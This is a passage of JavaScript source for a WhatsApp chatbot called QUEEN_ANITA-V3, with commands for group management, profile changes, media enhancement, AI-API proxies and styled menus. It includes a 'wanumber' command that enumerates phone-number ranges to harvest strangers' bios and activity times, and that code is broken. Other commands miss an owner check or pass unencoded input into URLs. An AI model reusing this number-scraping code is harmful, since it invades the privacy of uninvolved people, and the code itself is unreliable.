            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '`QUEEN_ANITA-V3`'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./zio.jpg') }, { upload: ptz. waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: false,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '`David Cyril`',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break
            

            
        
       case 'hdvid': {
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return reply(`Where's the video??`);
  reply("`Loading Please wait..`");
  const media = await ptz.downloadAndSaveMediaMessage(q);
  const url = await TelegraPH(media);
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -vf "hqdn3d=1.5:1.5:6:6,nlmeans=p=7:s=7,vaguedenoiser=threshold=2.0:method=soft:nsteps=5,deband,atadenoise,unsharp=3:3:0.6,eq=brightness=0.05:contrast=1.2:saturation=1.1" -vcodec libx264 -profile:v main -level 4.1 -preset veryslow -crf 18 -x264-params ref=4 -acodec copy -movflags +faststart ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    ptz.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: m});
  });     
}

break

case 'shutdown':
                if (!isCreator) return reply('For My Owner Only') 
await ptz.sendMessage(m?.chat, {react: {text: `⚠️`,key: m?.key,}})
await ptz.sendMessage(m?.chat, {react: {text: `👋`,key: m?.key,}}) 
                reply('`Shutting Down....`')
                await sleep(3000)
                process.exit()
            break
       

            
case 'thai':{
await loading() 
var notnot = JSON.parse(fs.readFileSync('./david-media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'Queen_Anita-V3'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: 'David Cyril',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
}
break            


            
            
case 'setbio':{
if (!isCreator) return reply('For My Owner Only') 
if (!text) return reply(`Where is the text?\nExample: ${prefix + command} David Cyril`)
await ptz.sendMessage(m?.chat, {react: {text: `✍🏼`,key: m?.key,}})
    await ptz.updateProfileStatus(text)
    reply('`Success in changing bio, Boss!!🫡`')
await ptz.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})
    }
    break           




case "setpp1":
            case "setpp":
            case "setppbot":
                if (!isCreator) return reply(`For My Owner Only`);
                if (!quoted)
                    return reply(
                        `Send/Reply Image With Caption ${prefix + command}`
                    );
                if (!/image/.test(mime))
                    return reply(
                        `Send/Reply Image With Caption ${prefix + command}`
                    );
                if (/webp/.test(mime))
                    return reply(
                        `Send/Reply Image With Caption ${prefix + command}`
                    );
                var medis = await ptz.downloadAndSaveMediaMessage(
                    quoted,
                    "ppbot.jpeg"
                );
                if (args[0] == "full") {
                    var { img } = await generateProfilePicture(medis);
                    await ptz.query({
                        tag: "iq",
                        attrs: {
                            to: botNumber,
                            type: "set",
                            xmlns: "w:profile:picture"
                        },
                        content: [
                            {
                                tag: "picture",
                                attrs: {
                                    type: "image"
                                },
                                content: img
                            }
                        ]
                    });
                    fs.unlinkSync(medis);
                    reply(`Done`);
                } else {
                    var memeg = await ptz.updateProfilePicture(
                        botNumber,
                        {
                            url: medis
                        }
                    );
                    fs.unlinkSync(medis);
                    reply(`Done`);
                }
                break;
case "linkgroup":
            case "grouplink":
            case "linkgrup":
            case "linkgc":
                if (!m.isGroup) return reply(mess.group);
               if (!m.isGroup) return (`For Group Only`)  
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`);
                let response = await ptz.groupInviteCode(m.chat);
                ptz.sendText(
                    m.chat,
                    `ðŸ‘¥ *GROUP LINK INFO*\nðŸ“› *Name :* ${
                        groupMetadata.subject
                    }\nðŸ‘¤ *Group Owner :* ${
                        groupMetadata.owner !== undefined
                            ? "@" + groupMetadata.owner.split`@`[0]
                            : "Not known"
                    }\nðŸŒ± *ID :* ${
                        groupMetadata.id
                    }\nðŸ”— *Chat Link :* https://chat.whatsapp.com/${response}\nðŸ‘¥ *Member :* ${
                        groupMetadata.participants.length
                    }\n`,
                    m,
                    {
                        detectLink: true
                    }
                );
                break;
            case "revoke":
            case "resetlink":
                if (!m.isGroup) return (`For Group Only`)  
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`);
                await ptz.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(
                            `Successful Reset, Group Invite Link ${groupMetadata.subject}`
                        );
                    })
                    .catch(err => reply(json(err)));
                break;                
                
        
 case 'getpp':
    if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
        return reply(`Reply to someone's message or tag a user with ${prefix + command}`);
    }

    try {
        // If the command is used in reply to someone's message
        let targetUser = m.quoted ? m.quoted.sender : m.mentionedJid[0];
        let profilePicUrl = await ptz.profilePictureUrl(targetUser, 'image');
        let responseMessage = `Profile picture of @${targetUser.split('@')[0]}`;
        await ptz.sendMessage(m.chat, { image: { url: profilePicUrl }, caption: responseMessage, mentions: [targetUser] });
    } catch (error) {
        reply("Couldn't fetch profile picture. The user might not have a profile picture or an error occurred.");
    }
    break;

                       
                
 case 'block': case 'ban': {
		if (!isCreator) return Owner()
await reply('`Tag Someone!`')		
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ptz.updateBlockStatus(users, 'block')
		await reply(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!isCreator) return (`For My Owner Only`) 
		await reply('`Tag Someone!`') 
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ptz.updateBlockStatus(users, 'unblock')
		await reply(`Done`)
	}
	break          
	
case 'mode-public': {
if (!isCreator) return reply('`For My Owner Only`')
ptz.public = true
reply('*Successfully Changed To Public Use*')
            }
            break
case 'mode-private': {
ptz.public = false
reply('*Successfully Changed To Personal Use*')
            }
            break            
            
            case '*Successfully Changed To Public Use*': {
if (!isCreator) return reply('`For My Owner Only`')
ptz.public = false
reply('*Success Turns Into Personal Use*')
            }
            break 
	
case 'tinyurl':{
   if(!q) return reply('`link?`')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function 
  (error, response, body) {
   try {
  reply(body)
  } catch (e) {
  reply(e)
  }
  })
  }
 break

                
case 'invite': {
	if (!m.isGroup) return Group()
	if (!isBotAdmins) return Admin()
if (!text) return reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2347043759577`)
if (text.includes('+')) return reply(`Enter the number together without *+*`)
if (isNaN(text)) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await ptz.groupInviteCode(group)
      await ptz.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply('`An invite link is sent to the user`') 
}
break      

case 'wanumber': case 'searchnumber': case 'searchno': case 'searchnumber':{
           	if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 234704375957x`)
var inputnumber = text.split(" ")[0]
        
        reply('`Searching for WhatsApp account in given range...`')
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            
            try {
                try {
                    var anu1 = await ptz.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
      
        case "chatgpt": 
if (!text) return reply('`Ask Me Anything`')
try {
let cct = await fetchJson(`https://widipe.com/gpt4?text=${text}`)
let resq = cct.result
reply(`${resq}`)
} catch (err) {
reply('Website error')
}
break



case 'play2': case 'play2': {
  if (!text) return reply(`*Give Me a Song Name!*`)
  try {
    let res = await yts(text)
    let url = res.all;
    let result = url[Math.floor(Math.random() * url.length)]
    let tekss = `▶️ *PLAYING AUDIO*\n*Title :* ${result.title}\n*Upload At :* ${result.ago}\n*Url :* ${result.url}\n\n⏸ *AUDIO PROCESSING....*`
    
    await ptz.sendMessage(m.chat, { image: { url: result.thumbnail},  caption: tekss },{ quoted: m })
    
  let load = await (await fetch(`https://apikita.exonity.xyz/api/ytdlp?url=${result.url}`)).json();
  let rix = load.result
  
    await ptz.sendMessage(m.chat, { audio: { url: rix.audio }, mimetype: 'audio/mp3', }, { quoted: m });
} catch (error) {
    reply('An error Occured' + error);
  }
}
break



        case "ragbot":
        if (!text) return reply('What do you want to ask ragbot?')
  let isurag = await fetchJson(`https://api.hyuunewbie.my.id/api/ragbot?message=${text}`)
let guaa = isurag.data.response
reply(guaa)  
        break
    case 'openai': case 'openaimon': case 'A-I': case "ai": case "openaimenu":
        let ain = "`"
        
        reply(`
╭┈──────────────────
│ *${m2}[ •  A I - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ᴄʜᴀᴛɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  ᴅᴇɢʀᴇᴇɢᴜʀᴜ <Qᴜᴇʀʏ>
│  ◦  ʀᴀɢʙᴏᴛ <Qᴜᴇʀʏ>
│  ◦  ꜱᴍᴀʀᴛ <Qᴜᴇʀʏ>
│  ◦  ᴀɪ-ꜱᴇᴀʀᴄʜ <Qᴜᴇʀʏ>
│  ◦  ᴛxᴛɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  ᴛxᴛ2ɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  ᴘʀᴏᴍᴛ-ɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  ɢᴘᴛɢᴏ <Qᴜᴇʀʏ>
│  ◦  ꜱɪᴍɪ <on/off> 
│  ◦  ᴅᴀʟʟᴇ <Qᴜᴇʀʏ>
│  ◦  ʀᴇᴍɪɴɪ <ɪᴍᴀɢᴇ>
│  ◦  ʙɪɴɢ-ᴀɪ <Qᴜᴇʀʏ>
│  ◦  ʙʟᴀᴄᴋʙᴏx <Qᴜᴇʀʏ>
│  ◦  ɴᴇᴠᴏ <Qᴜᴇʀʏ>
│  ◦  ʟᴜᴍɪɴᴀ <Qᴜᴇʀʏ>
│  ◦  ᴏ̨ᴜᴇᴇɴ_ᴀɴɪᴛᴀ-ᴠ1 <on/off>
│  ◦  ɢᴘᴛ4 <Qᴜᴇʀʏ>
│  ◦  ᴅɪꜰꜰᴜꜱɪᴏɴ <Qᴜᴇʀʏ>
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break

    case 'help': case 'menu': case 'simplemenu': case 'menulist': case 'menumon': case 'list': case 'allmenu':
    
await ptz.sendMessage(m?.chat, {react: {text: `👸`,key: m?.key,}})

let pedo = "`";

let teksskkk = `${tektek}`;
let sections = [{
		title: 'All simple Menu Bot', 
		rows: [{
	    title: 'A-i MENU LIST',
    	description: `<!> Display All Openai Feature •`, 
    	id: `${prefix}openaimon`
        },  
{
                   title: 'FUN MENU',
                   description: "<!> Display All Fun Menu List",
                   id: `${prefix}funmenu`
                   },
               {
                   title: 'GROUP MENU LIST',
                   description: "<!> Display All Group Feature",
                   id: `${prefix}groupmenu`
                   },
{
                   title: 'SPECIAL MENU ',
                   description: "<!> Display All SpecialMenu List",
                   id: `${prefix}specialmenu`
                   },
                   
               {
                   title: 'SYSTEM MENU LIST',
                   description: "<!> Display All Main Feature",
                   id: `${prefix}mainmon`
                   },
               {
                   title: 'TOOLS MENU LIST',
                   description: "<!> Display All Tools Feature",
                   id: `${prefix}toolsmon`
                   },
               {
                   title: 'NSFW MENU',
                   description: "<!> Display All NSFW Feature🔞",
                   id: `${prefix}nsfw`
                   },
               {
                   title: 'PHOTOOXY MENU LIST',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
                   {
                   title: 'DOWNLOAD MENU',
                   description: "<!> Display All Download Feature",
                   id: `${prefix}downloadermenu`
                   }, 
               {
                   title: 'EPHOTO MENU LIST',
                   description: "<!> Display All Ephoto Feature",
                   id: `${prefix}ephotomon`
                   },
               {
                   title: 'STICKER MENU LIST',
                   description: "<!> Display All Sticker Feature",
                   id: `${prefix}stickermon`
                   },
               {
                   title: 'TEMPORARY MENU LIST',
                   description: "<!> Display All Temporary Feature",
                   id: `${prefix}tempormon`
                   },  
               {
                   title: 'MENU LIST',
                   description: "<!> Display All Simple Menu",
                   id: `${prefix}menumon`
                   },  
               {
                   title: 'ALL MENU LIST',
                   description: "<!> Display All Menu List",
                   id: `${prefix}menu2`
                   },  
               {
                   title: 'ANIME MENU',
                   description: "<!> Display All Anime Feature",
                   id: `${prefix}animemenu`
                   },
                  {
                   title: 'PHOTOOXY MAKER MENU',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
               {
                   title: 'EPHOTO MAKER MENU',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}ephotomon`
                   },                   
               {
                   title: 'ANITA MENU LIST',
                   description: "<!> Display All Queen Anita Feature",
                   id: `${prefix}anitamenu`
                   },
                           {
		title: 'OWNER MENU LIST', 
		description: "<!> Display All Owner Feature •", 
		id: `${prefix}ownermenu`
	    }]
}]

let listMessage = {
    title: 'QUEEN_ANITA - MENU LIST',
    sections
};

let msghhhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m?.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '12036326753195844@newsletter',
                        newsletterName: `QUEEN_ANITA-V3 • ${runtime(process.uptime())}`,
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: ptz.decodeJid(ptz.user.id)
                    },
                    externalAdReply: {
                        title: '⟡ Q U E E N  • A N I T A - V 3 ⟡',
                        body: "• ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ •",
                        thumbnail: fs.readFileSync("./anitav3.jpg"),
                        sourceUrl: '',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teksskkk
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `© David-Cyril `
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ``,
                    thumbnailUrl: "",
                    gifPlayback: true,
                    subtitle: "QUEEN_ANITA-V3",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        document: fs.readFileSync('./package.json'),
                        mimetype: "application/msword",
                        jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: "QUEEN_ANITA-V3™",
                     }, {
                        upload: ptz.waUploadToServer
                    }))
                }),
                gifPlayback: true,
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                        "name": "single_select",
                        "buttonParamsJson": JSON.stringify(listMessage)
                    }]
                })
            })
        }
    }
}, {
    quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhh.key.remoteJid, msghhhhhhhhhhhhhhhhhhh.message, {
    messageId: msghhhhhhhhhhhhhhhhhhh.key.id
});
const musicFilePath = './anita-sounds/anitahello.mp3'; 

    // Sending the MP3 audio file
    await ptz.sendMessage(m.chat, {
        audio: { url: musicFilePath },
        mimetype: 'audio/mp4',  // Proper MIME type for audio
        ptt: true,  
    });
        break

       
        

         case "photooxymenu": case "photooxymon": case "photooxy":
        reply(`
╭┈──────────────────
│ *${m2}[ •  P H O X Y - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ꜱʜᴀᴅᴏᴡ 
│  ◦  ᴡʀɪᴛᴇ 
│  ◦  ʀᴏᴍᴀɴᴛɪᴄ 
│  ◦  ʙᴜʀɴᴘᴀᴘᴇʀ 
│  ◦  ꜱᴍᴏᴋᴇ 
│  ◦  ɴᴀʀᴜᴛᴏʙᴀɴɴᴇʀ 
│  ◦  ʟᴏᴠᴇ 
│  ◦  ᴜɴᴅᴇʀɢʀᴀꜱꜱ 
│  ◦  ᴅᴏᴜʙʟᴇʟᴏᴠᴇ 
│  ◦  ᴄᴏꜰꜰᴇᴄᴜᴘ 
│  ◦  ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴏᴄᴇᴀɴ 
│  ◦  ꜱᴍᴏᴋʏɴᴇᴏɴ 
│  ◦  ꜱᴛᴀʀꜱᴛᴇxᴛ 
│  ◦  ʀᴀɪɴʙᴏᴡᴇꜰꜰᴇᴄᴛ 
│  ◦  ʙᴀʟʟᴏᴏɴᴛᴇxᴛ 
│  ◦  ᴍᴇᴛᴀʟʟɪᴄᴇꜰꜰᴇᴄᴛ 
│  ◦  ᴇᴍʙʀᴏɪᴅᴇʀʏᴛᴇxᴛ 
│  ◦  ꜰʟᴀᴍɪɴɢᴛᴇxᴛ 
│  ◦  ꜱᴛᴏɴᴇᴛᴇxᴛ 
│  ◦  ᴡʀɪᴛᴇᴀʀᴛ 
│  ◦  ꜱᴜᴍᴍᴇʀᴛᴇxᴛ 
│  ◦  ᴡᴏʟꜰᴍᴇᴛᴀʟᴛᴇxᴛ 
│  ◦  ɴᴀᴛᴜʀᴇ3ᴅᴛᴇxᴛ 
│  ◦  ʀᴏꜱᴇꜱᴛᴇxᴛ 
│  ◦  ɴᴀᴛᴜʀᴇᴛʏᴘᴏɢʀᴀᴘʜʏ 
│  ◦  Qᴜᴏᴛᴇꜱᴜɴᴅᴇʀ 
│  ◦  ꜱʜɪɴᴇᴛᴇxᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break
                case "ephotomenu": case "ephotomon": case "ephoto":
        reply(`
╭┈──────────────────
│ *${m2}[ • E P H O T O - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ɢʟɪᴛᴄʜᴛᴇxᴛ 
│  ◦  ᴡʀɪᴛᴇᴛᴇxᴛ 
│  ◦  ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ 
│  ◦  ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ 
│  ◦  ᴘɪxᴇʟɢʟɪᴛᴄʜ 
│  ◦  ɴᴇᴏɴɢʟɪᴛᴄʜ 
│  ◦  ꜰʟᴀɢᴛᴇxᴛ 
│  ◦  ꜰʟᴀɢ3ᴅᴛᴇxᴛ 
│  ◦  ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ 
│  ◦  ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ 
│  ◦  ɢʟᴏᴡɪɴɢᴛᴇxᴛ 
│  ◦  ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ 
│  ◦  ʟᴏɢᴏᴍᴀᴋᴇʀ 
│  ◦  ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ 
│  ◦  ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ 
│  ◦  ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ 
│  ◦  ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ 
│  ◦  ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ 
│  ◦  ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ 
│  ◦  ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ 
│  ◦  ʟᴜxᴜʀʏɢᴏʟᴅ 
│  ◦  ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ 
│  ◦  ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ 
│  ◦  ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ 
│  ◦  1917ꜱᴛʏʟᴇ 
│  ◦  ᴍᴀᴋɪɴɢɴᴇᴏɴ 
│  ◦  ʀᴏʏᴀʟᴛᴇxᴛ 
│  ◦  ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ 
│  ◦  ɢᴀʟᴀxʏꜱᴛʏʟᴇ 
│  ◦  ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break
  
  
       
        case "voicemon": case "voicemenu":
        reply(`
╭┈──────────────────
│ *${m2}[ • C O N V E R T E R • ]${m2}*
╭┈──────────────────
│  ◦  ʙᴀꜱꜱ
│  ◦  ʙʟᴏᴡɴ
│  ◦  ᴅᴇᴇᴘ
│  ◦  ᴇᴀʀʀᴀᴘᴇ
│  ◦  ꜰᴀꜱᴛ
│  ◦  ꜰᴀᴛ
│  ◦  ɴɪɢʜᴛᴄᴏʀᴇ
│  ◦  ʀᴇᴠᴇʀꜱᴇ
│  ◦  ʀᴏʙᴏᴛ
│  ◦  ꜱʟᴏᴡ
│  ◦  ꜱᴍᴏᴏᴛʜ
│  ◦  ᴛᴜᴘᴀɪ
│  ◦  ꜱᴍᴏᴏᴛʜ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
case "funmenu": case "fun-menu":
        reply(`
╭┈──────────────────
│ *${m2}[ F U N - M E N U ‎]${m2}*
╭┈──────────────────
│  ◦  ғᴀᴄᴛ
│  ◦  ʀᴀᴛᴇ
│  ◦  ғʟɪᴘᴄᴏɪɴ
│  ◦  ᴊᴏᴋᴇ
│  ◦  ᴅᴀʀᴇ
│  ◦  ᴛʀᴜᴛʜ
│  ◦  ᴍɪɴᴅʀᴇᴀᴅᴇʀ
│  ◦  ᴍᴏᴏᴅ
│  ◦  sᴛᴜᴘɪᴅᴄʜᴇᴄᴋ
│  ◦  ɢᴀʏᴄʜᴇᴄᴋ
│  ◦  ᴡᴀɪғᴜᴄʜᴇᴄᴋ
│  ◦  ʜᴏᴛᴄʜᴇᴄᴋ
│  ◦  ᴜɴᴄʟᴇᴀɴᴄʜᴇᴄᴋ
│  ◦  ᴇᴠɪʟᴄʜᴇᴄᴋ
│  ◦  sᴍᴀʀᴛᴄʜᴇᴄᴋ
│  ◦  sᴏᴜʟᴍᴀᴛᴇ <ᴛᴀɢ>
│  ◦  ᴄᴏᴜᴘʟᴇ <ᴛᴀɢ>
│  ◦  ᴡʜᴀᴛ
│  ◦  ᴡʜᴇʀᴇ
│  ◦  ᴡʜᴇɴ
│  ◦  ɪs
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break        
        
 case "downloader": case "downloadermenu":
        reply(`
╭┈──────────────────
│ *${m2}[ D O W N L O A D E R - M E N U ]${m2}*
╭┈──────────────────
│  ◦  ᴘʟᴀʏ
│  ◦  ᴘʟᴀʏ2
│  ◦  sᴏɴɢ
│  ◦  ᴛᴡɪᴛᴛᴇʀ
│  ◦  ʏᴛᴍᴘ3
│  ◦  ʏᴛᴍᴘ4
│  ◦  ɢɪᴛᴄʟᴏɴᴇ
│  ◦  ɪɴsᴛᴀɢʀᴀᴍ
│  ◦  ᴀᴘᴋ
│  ◦  ʏᴛs
│  ◦  ᴍᴇᴅɪᴀғɪʀᴇ
│  ◦  ғᴀᴄᴇʙᴏᴏᴋ
│  ◦  ɪɴsᴛᴀɢʀᴀᴍ
│  ◦  ᴛᴇʀᴀʙᴏx
│  ◦  ʟʏʀɪᴄs
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎© David-Cyril‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break    
           
    case "groupmon": case "groupmenu":
        reply(`
╭┈──────────────────
│ *${m2}[ •  G R O U P - M E N U ‎ • ]${m2}*
╭┈──────────────────
│  ◦  ᴀᴅᴅ <ᴛᴀɢꜱ>
│  ◦  ᴋɪᴄᴋ <ᴛᴀɢꜱ>
│  ◦  ᴇᴠᴇʀʏᴏɴᴇ 
│  ◦  ᴛᴀɢᴀʟʟ
│  ◦  ʟɪsᴛᴏɴʟɪɴᴇ
│  ◦  ᴡᴇʟᴄᴏᴍᴇ < ᴏɴ / ᴏғғ >
│  ◦  ʜᴀᴄᴋ
│  ◦  ʟᴇᴀᴠᴇɢᴄ
│  ◦  ɢᴇᴛᴅᴇsᴋɢᴄ
│  ◦  ɢᴇᴛɴᴀᴍᴇ
│  ◦  ɢᴇᴛᴘᴘɢᴄ
│  ◦  sᴇᴛᴘᴘɢᴄ
│  ◦  ᴏᴘᴇɴɢʀᴏᴜᴘ
│  ◦  ᴄʟᴏsᴇɢʀᴏᴜᴘ
│  ◦  sᴠᴄᴏɴᴛᴀᴄᴛ
│  ◦  ᴊᴏɪɴ 
│  ◦  ɪɴᴠɪᴛᴇ
│  ◦  ᴄʀᴇᴀᴛᴇɢᴄ
│  ◦  ʟɪɴᴋɢᴄ
│  ◦  ʀᴇsᴇᴛʟɪɴᴋ
│  ◦  ʜɪᴅᴇᴛᴀɢ
│  ◦  ᴀɴᴛɪʟɪɴᴋ  <ꜱᴇʟᴇᴄᴛ>
│  ◦  ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢꜱ>
